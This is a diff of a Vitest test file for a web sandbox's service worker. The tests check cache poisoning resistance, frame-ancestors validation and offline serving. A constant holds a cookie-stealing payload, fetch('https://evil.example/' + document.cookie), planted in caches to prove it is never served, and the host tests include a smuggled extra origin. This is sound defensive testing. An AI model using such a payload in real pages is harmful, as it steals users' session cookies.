@@ -1,294 +1,197 @@
 import { describe, expect, it } from "vitest";
-import { ORIGIN, SandboxWorker } from "./worker-harness";
+import { ASSETS, HOST, ORIGIN, SandboxWorker } from "./worker-harness";
 
-const LIST = `${ORIGIN}/views/precache.json`;
-const LESSON = ["/views/assets/lesson-a.js", "/views/assets/shared-a.js"];
-const PRACTICE = ["/views/assets/practice-a.js", "/views/assets/shared-a.css"];
+const LESSON = "/views/assets/lesson-a.js";
+const PRACTICE = "/views/assets/practice-a.js";
 const FONT = "/views/assets/inter-a.woff2";
-const BUILD = [...LESSON, ...PRACTICE, FONT];
+const BUILD = { [LESSON]: "lesson", [PRACTICE]: "practice", [FONT]: "font" };
+const PLANTED = "fetch('https://evil.example/' + document.cookie)";
+const FULL = new DOMException(
+  "The quota has been exceeded.",
+  "QuotaExceededError",
+);
 
-function deployed(paths: string[] = BUILD): SandboxWorker {
-  const worker = new SandboxWorker();
-  worker.list(paths);
-  for (const path of paths) worker.serve(path, path);
-  return worker;
-}
-
-const pastFiles = (count: number) =>
-  Array.from({ length: count }, (_, index) => `/views/assets/past-${index}.js`);
-
+const at = (path: string) => `${ORIGIN}${path}`;
+const framed = (path: string, host = HOST) =>
+  at(`${path}?host=${encodeURIComponent(host)}`);
 const fetchesOf = (worker: SandboxWorker, path: string) =>
-  worker.fetched.filter((fetch) => fetch.url === `${ORIGIN}${path}`).length;
+  worker.fetched.filter((address) => address === at(path)).length;
 
-describe("the sandbox's service worker", () => {
-  it("caches every view's files once any one view has loaded", async () => {
-    const worker = deployed();
+describe("the sandbox's pages", () => {
+  it.each([
+    ["/ui-sandbox", "proxy page", `frame-ancestors ${HOST}`],
+    ["/ui-sandbox-frame", "frame page", `frame-ancestors 'self' ${HOST}`],
+  ])(
+    "builds %s itself, with no connection and nothing cached",
+    async (path, body, policy) => {
+      const worker = new SandboxWorker(BUILD);
+      worker.online = false;
 
-    await worker.keep(
-      `${ORIGIN}/ui-sandbox?host=x`,
-      ...LESSON.map((path) => `${ORIGIN}${path}`),
-    );
+      const response = await worker.request(framed(path));
 
-    expect(worker.assets().sort()).toEqual([...BUILD].sort());
+      expect(await response?.text()).toBe(body);
+      expect(response?.headers.get("content-security-policy")).toBe(policy);
+      expect(response?.headers.get("content-type")).toBe(
+        "text/html; charset=utf-8",
+      );
+    },
+  );
+
+  it.each(["/ui-sandbox", "/ui-sandbox-frame"])(
+    "never answers %s with a copy a view planted in a cache",
+    async (path) => {
+      const worker = new SandboxWorker(BUILD);
+      for (const name of [ASSETS, "graspy-sandbox-pages-v1"])
+        await worker.plant(name, framed(path), PLANTED);
+
+      const response = await worker.request(framed(path));
+
+      expect(await response?.text()).not.toBe(PLANTED);
+      expect(response?.headers.get("content-security-policy")).toContain(HOST);
+      expect(worker.fetched).toEqual([]);
+    },
+  );
+
+  it.each([HOST, "https://a1b2c3d4.graspy.pages.dev"])(
+    "lets %s frame the sandbox",
+    async (host) => {
+      const worker = new SandboxWorker(BUILD);
+
+      const response = await worker.request(framed("/ui-sandbox", host));
+
+      expect(response?.status).toBe(200);
+    },
+  );
+
+  it.each([
+    "https://evil.example",
+    ORIGIN,
+    "https://a.b.graspy.pages.dev",
+    "https://.graspy.pages.dev",
+    `${HOST}/`,
+    `${HOST} https://evil.example`,
+    "https://evil.example?https://graspy.test",
+    "",
+  ])("lets no page be framed by %j", async (host) => {
+    const worker = new SandboxWorker(BUILD);
+
+    for (const path of ["/ui-sandbox", "/ui-sandbox-frame"]) {
+      const response = await worker.request(framed(path, host));
+      expect(response?.status).toBe(400);
+      expect(response?.headers.get("content-security-policy")).toBeNull();
+    }
+  });
+});
+
+describe("the view's files", () => {
+  it("caches every view's files once a sandbox asks", async () => {
+    const worker = new SandboxWorker(BUILD);
+
+    await worker.precache();
+
+    expect(worker.assets().sort()).toEqual(Object.keys(BUILD).sort());
   });
 
   it("opens a view never shown when there is no connection", async () => {
-    const worker = deployed();
-    await worker.keep(...LESSON.map((path) => `${ORIGIN}${path}`));
+    const worker = new SandboxWorker(BUILD);
+    await worker.precache();
     worker.online = false;
 
-    const response = await worker.request(`${ORIGIN}${PRACTICE[0]}`);
+    const response = await worker.request(at(PRACTICE));
 
-    expect(await response?.text()).toBe(PRACTICE[0]);
+    expect(await response?.text()).toBe("practice");
   });
 
-  it("asks for the list past the browser's cache, which it may have kept", async () => {
-    const worker = deployed();
+  it("serves the network's file, and keeps it, in place of a planted copy", async () => {
+    const worker = new SandboxWorker(BUILD);
+    await worker.precache();
+    await worker.plant(ASSETS, PRACTICE, PLANTED);
 
-    await worker.keep();
+    const response = await worker.request(at(PRACTICE));
 
-    expect(worker.fetched.find((fetch) => fetch.url === LIST)?.cache).toBe(
-      "no-cache",
+    expect(await response?.text()).toBe("practice");
+    expect(await (await worker.cache(ASSETS).match(PRACTICE))?.text()).toBe(
+      "practice",
     );
   });
 
-  it("fetches only the files it has not cached, which never change", async () => {
-    const worker = deployed();
+  it("fails without a connection rather than serve a planted copy", async () => {
+    const worker = new SandboxWorker(BUILD);
+    await worker.plant(ASSETS, PRACTICE, PLANTED);
+    worker.online = false;
 
-    await worker.keep();
-    await worker.keep();
-
-    for (const path of BUILD) expect(fetchesOf(worker, path)).toBe(1);
+    await expect(worker.request(at(PRACTICE))).rejects.toThrow();
+    expect(worker.assets()).not.toContain(PRACTICE);
   });
 
-  it("makes one pass however many sandboxes ask at once", async () => {
-    const worker = deployed();
+  it("leaves a file not in its build to the network, planted or not", async () => {
+    const worker = new SandboxWorker(BUILD);
+    const past = "/views/assets/lesson-old.js";
+    await worker.plant(ASSETS, past, PLANTED);
 
-    await Promise.all([worker.keep(), worker.keep(), worker.keep()]);
-
-    expect(fetchesOf(worker, "/views/precache.json")).toBe(1);
-    for (const path of BUILD) expect(fetchesOf(worker, path)).toBe(1);
+    expect(await worker.request(at(past))).toBeUndefined();
   });
 
-  it("caches only this origin's view files, whatever the list says", async () => {
-    const listed = [
-      "https://elsewhere.test/views/assets/x.js",
-      "/api/lessons",
-      "/views/lesson.html",
-      "/ui-sandbox",
-      42,
-      FONT,
-    ];
-    const worker = new SandboxWorker();
-    worker.list(listed);
-    for (const path of [
-      "/api/lessons",
-      "/views/lesson.html",
-      "/ui-sandbox",
-      FONT,
-    ])
-      worker.serve(path, path);
+  it("keeps no file the network gave with another digest", async () => {
+    const worker = new SandboxWorker(BUILD);
+    worker.serve(LESSON, "lesson of another build");
 
-    await worker.keep();
+    const response = await worker.request(at(LESSON));
+    await worker.precache();
 
-    expect(worker.assets()).toEqual([FONT]);
-    expect(worker.fetched.map((fetch) => fetch.url)).toEqual([
-      LIST,
-      `${ORIGIN}${FONT}`,
-    ]);
+    expect(await response?.text()).toBe("lesson of another build");
+    expect(worker.assets()).not.toContain(LESSON);
+  });
+
+  it("drops whatever else its cache holds", async () => {
+    const worker = new SandboxWorker(BUILD);
+    await worker.plant(ASSETS, "/views/assets/lesson-old.js", "old");
+    await worker.plant(ASSETS, "/ui-sandbox-frame?host=x", PLANTED);
+
+    await worker.precache();
+
+    expect(worker.assets().sort()).toEqual(Object.keys(BUILD).sort());
+  });
+
+  it("drops every other cache as it takes over", async () => {
+    const worker = new SandboxWorker(BUILD);
+    await worker.plant("graspy-sandbox-pages-v1", "/ui-sandbox", PLANTED);
+    await worker.plant("graspy-view-assets-v1", LESSON, PLANTED);
+    await worker.precache();
+
+    await worker.activate();
+
+    expect([...worker.caches.keys()]).toEqual([ASSETS]);
+  });
+
+  it("fetches only the files it lacks, once however many sandboxes ask", async () => {
+    const worker = new SandboxWorker(BUILD);
+
+    await Promise.all([worker.precache(), worker.precache()]);
+    await worker.precache();
+
+    for (const path of Object.keys(BUILD))
+      expect(fetchesOf(worker, path)).toBe(1);
   });
 
   it("keeps going past a file that fails, and fetches it on the next pass", async () => {
-    const worker = deployed();
-    worker.network.delete(`${ORIGIN}${FONT}`);
+    const worker = new SandboxWorker(BUILD);
+    worker.network.delete(at(FONT));
 
-    await worker.keep();
-    expect(worker.assets()).toEqual(BUILD.filter((path) => path !== FONT));
+    await worker.precache();
+    expect(worker.assets()).not.toContain(FONT);
 
-    worker.serve(FONT, FONT);
-    await worker.keep();
+    worker.serve(FONT, "font");
+    await worker.precache();
     expect(worker.assets()).toContain(FONT);
   });
 
-  it("changes nothing without a connection", async () => {
-    const worker = deployed();
-    await worker.keep();
-    worker.online = false;
+  it("answers from the network though storing the file fails", async () => {
+    const worker = new SandboxWorker(BUILD);
+    worker.cache(ASSETS).refusal = FULL;
 
-    await worker.keep();
+    const response = await worker.request(at(LESSON));
 
-    expect(worker.assets().sort()).toEqual([...BUILD].sort());
-  });
-
-  it("keeps a past build's files for the pages kept from it", async () => {
-    const worker = deployed(["/views/assets/lesson-old.js"]);
-    await worker.keep();
-    worker.list(BUILD);
-    for (const path of BUILD) worker.serve(path, path);
-
-    await worker.keep();
-
-    expect(worker.assets()).toContain("/views/assets/lesson-old.js");
-  });
-
-  it("drops the oldest past files beyond its cap, never the current build's", async () => {
-    const past = Array.from(
-      { length: 119 },
-      (_, index) => `/views/assets/past-${index}.js`,
-    );
-    // The font, kept first and so the oldest, is in both builds.
-    const worker = deployed([FONT, ...past]);
-    await worker.keep();
-    worker.list(BUILD);
-    for (const path of BUILD) worker.serve(path, path);
-
-    await worker.keep();
-
-    const cached = worker.assets();
-    expect(cached).toHaveLength(120);
-    expect(cached).toEqual(expect.arrayContaining(BUILD));
-    expect(cached).not.toContain("/views/assets/past-3.js");
-    expect(cached).toContain("/views/assets/past-4.js");
-  });
-
-  it("trims nothing as a view loads, however full the cache", async () => {
-    const past = pastFiles(120);
-    const worker = deployed(past);
-    await worker.keep();
-    worker.serve(FONT, FONT);
-
-    await worker.request(`${ORIGIN}${FONT}`);
-
-    expect(worker.assets()).toEqual([...past, FONT]);
-  });
-
-  it("still trims when a file's fetch fails outright mid-pass", async () => {
-    const worker = deployed(pastFiles(120));
-    await worker.keep();
-    worker.list(BUILD);
-    for (const path of BUILD) worker.serve(path, path);
-    worker.network.set(`${ORIGIN}${LESSON[0]}`, () => {
-      throw new TypeError("Failed to fetch");
-    });
-
-    await worker.keep();
-
-    expect(worker.assets()).toHaveLength(120);
-    expect(worker.assets()).not.toContain("/views/assets/past-3.js");
-  });
-
-  it("drops the longest unused past files first", async () => {
-    const worker = deployed(pastFiles(120));
-    await worker.keep();
-    await worker.request(`${ORIGIN}/views/assets/past-0.js`);
-    worker.list(BUILD);
-    for (const path of BUILD) worker.serve(path, path);
-
-    await worker.keep();
-
-    expect(worker.assets()).toContain("/views/assets/past-0.js");
-    expect(worker.assets()).not.toContain("/views/assets/past-1.js");
-  });
-
-  it.each(["/ui-sandbox?host=x", "/ui-sandbox-frame?host=x"])(
-    "opens %s from its last copy when there is no connection",
-    async (path) => {
-      const worker = new SandboxWorker();
-      worker.serve(path, path);
-      await worker.request(`${ORIGIN}${path}`);
-      worker.online = false;
-
-      const response = await worker.request(`${ORIGIN}${path}`);
-
-      expect(await response?.text()).toBe(path);
-    },
-  );
-
-  it("keeps the pages the sandbox loaded before it controlled them", async () => {
-    const worker = deployed();
-    const pages = ["/ui-sandbox?host=x", "/ui-sandbox-frame?host=x"];
-    for (const path of pages) worker.serve(path, path);
-
-    await worker.keep(...pages.map((path) => `${ORIGIN}${path}`));
-
-    expect(worker.pages()).toEqual(pages);
-  });
-
-  it("opens the view's page from its copy at once, fetching the next", async () => {
-    const worker = new SandboxWorker();
-    const page = "/ui-sandbox-frame?host=x";
-    worker.serve(page, "first");
-    await worker.request(`${ORIGIN}${page}`);
-    worker.serve(page, "second");
-
-    const now = await worker.request(`${ORIGIN}${page}`);
-    const next = await worker.request(`${ORIGIN}${page}`);
-
-    expect(await now?.text()).toBe("first");
-    expect(await next?.text()).toBe("second");
-  });
-
-  it("opens the proxy page from the network while there is one", async () => {
-    const worker = new SandboxWorker();
-    const page = "/ui-sandbox?host=x";
-    worker.serve(page, "first");
-    await worker.request(`${ORIGIN}${page}`);
-    worker.serve(page, "second");
-
-    const response = await worker.request(`${ORIGIN}${page}`);
-
-    expect(await response?.text()).toBe("second");
-  });
-
-  it.each([LESSON[0], "/ui-sandbox?host=x", "/ui-sandbox-frame?host=x"])(
-    "answers %s from the network though storing it fails",
-    async (path) => {
-      const worker = new SandboxWorker();
-      worker.serve(path, path);
-      for (const name of ["graspy-view-assets-v1", "graspy-sandbox-pages-v1"])
-        worker.cache(name).refusal = new DOMException(
-          "The quota has been exceeded.",
-          "QuotaExceededError",
-        );
-
-      const response = await worker.request(`${ORIGIN}${path}`);
-
-      expect(await response?.text()).toBe(path);
-    },
-  );
-
-  it("stores a file's use once while it runs, not on every view", async () => {
-    const worker = deployed();
-    await worker.keep();
-    const cache = worker.cache("graspy-view-assets-v1");
-    const before = cache.writes.length;
-
-    for (let view = 0; view < 3; view++)
-      await worker.request(`${ORIGIN}${LESSON[0]}`);
-
-    expect(cache.writes.slice(before)).toEqual([`${ORIGIN}${LESSON[0]}`]);
-  });
-
-  it("serves a cached file though storing its use fails", async () => {
-    const worker = deployed();
-    await worker.keep();
-    worker.online = false;
-    worker.cache("graspy-view-assets-v1").refusal = new DOMException(
-      "The quota has been exceeded.",
-      "QuotaExceededError",
-    );
-
-    const response = await worker.request(`${ORIGIN}${LESSON[0]}`);
-
-    expect(await response?.text()).toBe(LESSON[0]);
-  });
-
-  it("still keeps what the sandbox page loaded when there is no list", async () => {
-    const worker = new SandboxWorker();
-    worker.serve(LESSON[0], "lesson");
-
-    await worker.keep(`${ORIGIN}${LESSON[0]}`);
-
-    expect(worker.assets()).toEqual([LESSON[0]]);
+    expect(await response?.text()).toBe("lesson");
   });
 });
